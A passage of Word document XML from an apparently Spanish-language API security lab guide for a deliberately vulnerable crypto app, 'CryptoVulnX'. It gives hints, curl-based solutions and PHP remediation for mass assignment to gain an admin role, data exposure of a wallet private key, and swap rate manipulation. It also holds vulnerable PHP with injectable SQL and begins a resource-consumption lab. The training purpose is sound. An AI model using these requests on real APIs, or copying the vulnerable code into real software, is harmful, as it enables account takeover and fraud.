          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>kyc_verified</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>is_admin</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> son comunes. Intenta agregarlos en tu peticion JSON de registro.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pista 2 - Exposicion de Datos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Realiza una consulta al endpoint de balance de tu wallet y examina cuidadosamente TODOS los campos de la respuesta JSON. ¿Hay algun campo que no deberia estar visible para el usuario a traves de la API?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pista 3 - Manipulacion de Rate</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">El endpoint de swap calcula cuanto recibes basandose en un parametro </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>rate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. ¿Que pasa si incluyes tu propio valor de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>rate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en la peticion? El servidor no valida este valor contra la tasa real del mercado.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Ataque 1 - Mass Assignment en Registro</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1 - Registro normal para observar el flujo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/auth/register.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"testuser","email":"test@test.com","password":"test123"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "user_id": 5,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "role": "user",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "kyc_verified": 0</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 2 - Registro con mass assignment para obtener rol admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/auth/register.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "username": "hacker",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "email": "h@h.com",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "password": "test",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "role": "admin",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "kyc_verified": 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "user_id": 6,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "role": "admin",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "kyc_verified": 1</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>El usuario se ha registrado como administrador con KYC verificado.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 3 - Verificar acceso de admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Login con el nuevo usuario admin</w:t>
        <w:br/>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"hacker","password":"test"}'</w:t>
        <w:br/>
        <w:br/>
        <w:t># Usar el token para acceder a endpoints de admin</w:t>
        <w:br/>
        <w:t>curl -s -X GET http://localhost/appsec/api/v1/admin/users.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN_HACKER&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Ataque 2 - Exposicion Excesiva de Datos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1 - Consultar balance de la wallet</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X GET "http://localhost/appsec/api/v1/wallets/balance.php?wallet_id=3" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "wallet_id": 3,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "user_id": 3,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "balance": "0.05000000",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "currency": "BTC",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "private_key": "L4gB7MyCKQBuWNbKzYToGMC2VDh6HTfnm7RwG9GU1N6GBHAaRdZq",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "created_at": "2024-01-10T08:00:00Z",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "internal_flags": "standard_tier",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "last_ip": "192.168.1.50"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>La respuesta expone la `private_key`, `internal_flags` y `last_ip` del usuario, campos que nunca deberian ser visibles en la API.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Ataque 3 - Manipulacion de Rate en Swap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1 - Realizar un swap normal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN&gt;" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "from": "BTC",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "to": "ETH",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "amount": 0.01</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "from": "BTC",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "to": "ETH",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "amount_sent": 0.01,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "rate": 15.5,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "amount_received": 0.155</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 2 - Enviar un rate personalizado manipulado</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN&gt;" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "from": "BTC",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "to": "ETH",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "amount": 0.01,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "rate": 999999</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "from": "BTC",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "to": "ETH",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "amount_sent": 0.01,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "rate": 999999,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "amount_received": 9999.99</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Con 0.01 BTC se obtienen 9,999.99 ETH al manipular la tasa de conversion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Corregir Mass Assignment - Lista Blanca de Campos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// VULNERABLE - Acepta todos los campos del JSON</w:t>
        <w:br/>
        <w:t>$data = json_decode(file_get_contents("php://input"), true);</w:t>
        <w:br/>
        <w:t>$query = "INSERT INTO users (username, email, password, role, kyc_verified)</w:t>
        <w:br/>
        <w:t xml:space="preserve">          VALUES ('{$data['username']}', '{$data['email']}', '{$data['password']}',</w:t>
        <w:br/>
        <w:t xml:space="preserve">                  '{$data['role']}', '{$data['kyc_verified']}')";</w:t>
        <w:br/>
        <w:br/>
        <w:t>// SEGURO - Lista blanca de campos permitidos</w:t>
        <w:br/>
        <w:t>$data = json_decode(file_get_contents("php://input"), true);</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Solo aceptar campos permitidos para registro</w:t>
        <w:br/>
        <w:t>$allowed_fields = ['username', 'email', 'password'];</w:t>
        <w:br/>
        <w:t>$filtered_data = array_intersect_key($data, array_flip($allowed_fields));</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Valores por defecto seguros para campos sensibles</w:t>
        <w:br/>
        <w:t>$stmt = $conn-&gt;prepare("INSERT INTO users (username, email, password_hash, role, kyc_verified)</w:t>
        <w:br/>
        <w:t xml:space="preserve">                         VALUES (?, ?, ?, 'user', 0)");</w:t>
        <w:br/>
        <w:t>$password_hash = password_hash($filtered_data['password'], PASSWORD_BCRYPT);</w:t>
        <w:br/>
        <w:t>$stmt-&gt;bind_param("sss", $filtered_data['username'], $filtered_data['email'], $password_hash);</w:t>
        <w:br/>
        <w:t>$stmt-&gt;execute();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Corregir Exposicion de Datos - Filtrar Propiedades de Respuesta</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// VULNERABLE - Devuelve SELECT * completo</w:t>
        <w:br/>
        <w:t>$query = "SELECT * FROM wallets WHERE id = $wallet_id";</w:t>
        <w:br/>
        <w:t>$result = $conn-&gt;query($query);</w:t>
        <w:br/>
        <w:t>echo json_encode($result-&gt;fetch_assoc());</w:t>
        <w:br/>
        <w:br/>
        <w:t>// SEGURO - Seleccionar solo campos necesarios y filtrar respuesta</w:t>
        <w:br/>
        <w:t>$stmt = $conn-&gt;prepare("SELECT id, balance, currency, address FROM wallets WHERE id = ? AND user_id = ?");</w:t>
        <w:br/>
        <w:t>$stmt-&gt;bind_param("ii", $wallet_id, $authenticated_user_id);</w:t>
        <w:br/>
        <w:t>$stmt-&gt;execute();</w:t>
        <w:br/>
        <w:t>$wallet = $stmt-&gt;get_result()-&gt;fetch_assoc();</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Capa adicional: filtrar propiedades de salida</w:t>
        <w:br/>
        <w:t>$public_fields = ['id', 'balance', 'currency', 'address'];</w:t>
        <w:br/>
        <w:t>$response = array_intersect_key($wallet, array_flip($public_fields));</w:t>
        <w:br/>
        <w:t>echo json_encode($response);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Corregir Manipulacion de Rate - Validar en el Servidor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// VULNERABLE - Acepta rate del cliente</w:t>
        <w:br/>
        <w:t>$data = json_decode(file_get_contents("php://input"), true);</w:t>
        <w:br/>
        <w:t>$rate = $data['rate'] ?? getMarketRate($data['from'], $data['to']);</w:t>
        <w:br/>
        <w:t>$amount_received = $data['amount'] * $rate;</w:t>
        <w:br/>
        <w:br/>
        <w:t>// SEGURO - Obtener rate exclusivamente del servidor</w:t>
        <w:br/>
        <w:t>$data = json_decode(file_get_contents("php://input"), true);</w:t>
        <w:br/>
        <w:br/>
        <w:t>// IGNORAR cualquier valor de rate enviado por el cliente</w:t>
        <w:br/>
        <w:t>$rate = getMarketRate($data['from'], $data['to']); // Fuente confiable del servidor</w:t>
        <w:br/>
        <w:t>$amount_received = $data['amount'] * $rate;</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Validar que el rate es razonable</w:t>
        <w:br/>
        <w:t>if ($rate &lt;= 0 || $rate &gt; 1000000) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(500);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "Error al obtener tasa de mercado"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Principios de Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lista blanca de campos</w:t>
      </w:r>
      <w:r>
        <w:t>: Definir explicitamente los campos que la API acepta en cada endpoint. Rechazar o ignorar cualquier campo adicional.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Filtrar respuestas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Nunca usar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>SELECT *</w:t>
      </w:r>
      <w:r>
        <w:t>. Seleccionar solo los campos necesarios y aplicar un filtro adicional antes de enviar la respuesta.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Valores del servidor</w:t>
      </w:r>
      <w:r>
        <w:t>: Los valores criticos como tasas de cambio, roles y estados deben calcularse o asignarse exclusivamente en el servidor.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DTOs (Data Transfer Objects)</w:t>
      </w:r>
      <w:r>
        <w:t>: Implementar objetos de transferencia de datos que definan estrictamente las propiedades de entrada y salida.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Validacion de esquema</w:t>
      </w:r>
      <w:r>
        <w:t>: Usar validacion de esquema JSON para rechazar peticiones con propiedades no esperadas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 04 - Unrestricted Resource Consumption</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Referencia OWASP: API4:2023 - Unrestricted Resource Consumption</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Objetivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Explotar la ausencia de limites en el consumo de recursos de la API de CryptoVulnX: extraer datos masivos sin paginacion, realizar fuerza bruta sin rate limiting y subir archivos sin restriccion de tamano.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Contexto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>La vulnerabilidad de Unrestricted Resource Consumption ocurre cuando una API no implementa limites adecuados en la cantidad de recursos que un cliente puede consumir. Esto incluye:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Sin paginacion</w:t>
      </w:r>
      <w:r>
        <w:t>: La API devuelve todos los registros de una consulta en una sola respuesta, permitiendo extraer grandes volumenes de datos y potencialmente causar denegacion de servicio.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Sin rate limiting</w:t>
      </w:r>
      <w:r>
        <w:t>: No hay limite en la cantidad de peticiones que un cliente puede realizar en un periodo de tiempo, facilitando ataques de fuerza bruta.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Sin limites de tamano de archivo</w:t>
      </w:r>
      <w:r>
        <w:t>: Los endpoints de carga de archivos no validan el tamano del archivo, permitiendo subir archivos enormes que consumen almacenamiento y memoria del servidor.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>En CryptoVulnX, estas fallas permiten:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Extraer el historial completo de transacciones de cualquier wallet en una sola peticion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Realizar fuerza bruta del PIN de restablecimiento de contrasena a maxima velocidad.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Subir archivos de cualquier tamano como documentos KYC, agotando el almacenamiento del servidor.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
